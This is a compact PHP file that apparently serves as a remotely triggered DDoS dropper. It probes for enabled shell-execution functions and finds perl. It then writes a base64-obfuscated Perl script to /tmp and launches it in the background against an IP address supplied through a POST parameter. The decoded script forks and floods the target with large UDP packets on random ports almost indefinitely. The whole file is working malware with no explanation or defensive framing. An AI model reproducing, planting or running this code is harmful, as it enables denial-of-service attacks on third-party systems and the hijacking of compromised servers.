<?php function isEnabled($func){return is_callable($func) && false === stripos(ini_get('disable_functions'),$func);}function fname($length=32){$characters= '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';$charactersLength=strlen($characters);$randomString='';for($i=0;$i<$length;$i++){$randomString .=$characters[rand(0,$charactersLength-1)];}return $randomString;}$ss=array("shell_exec","exec","system","passthru");$s="";foreach($ss as $i){if(isEnabled($i)){$s=$i;break;}}if($s==""){die("soff");}else{echo"son";}$s("which perl > /tmp/cp");$o=fopen("/tmp/cp","r");$p=fread($o,filesize("/tmp/cp"));fclose($o);$p=trim($p);if(!$p){die("poff");}else{echo "pon";}$f64 = "dXNlIFNvY2tldDt1c2Ugc3RyaWN0O215ICgkaXApID0gQEFSR1Y7bXkgJHNpemUgPSA2NTUwMDtteSAkdGltZSA9IDk5OTk5OTk5OTtteSAoJGlhZGRyLCRlbmR0aW1lLCRjb3VudCk7bXkgJHBpZCA9IGZvcms7IGlmICgkcGlkID09IDApeyRpYWRkciA9IGluZXRfYXRvbigiJGlwIik7JGVuZHRpbWUgPSB0aW1lKCkgKyAkdGltZTtzb2NrZXQoc2NrdCwgUEZfSU5FVCwgU09DS19ER1JBTSwgMTcpO215IEBjaGFycyA9ICgiQSIuLiJaIiwgImEiLi4ieiIpO215ICRzdHJpbmc7JHN0cmluZyAuPSAkY2hhcnNbcmFuZCBAY2hhcnNdIGZvciAxLi4kc2l6ZTskY291bnQgPSAwO2ZvciAoO3RpbWUoKSA8PSAkZW5kdGltZTsgJGNvdW50KyspIHtteSAkcG9ydCA9IGludCgxICsgcmFuZCg2NTUzNSAtIDEpKTtzZW5kKHNja3QsICRzdHJpbmcsIDAsIHBhY2tfc29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikpO319ZXhpdDs=";$f="/tmp/".fname();$o=fopen("$f","w+");fwrite($o,base64_decode($f64));fclose($o);$t=$_POST['t'];$s("$p $f $t > /dev/null 2>&1 &");exit;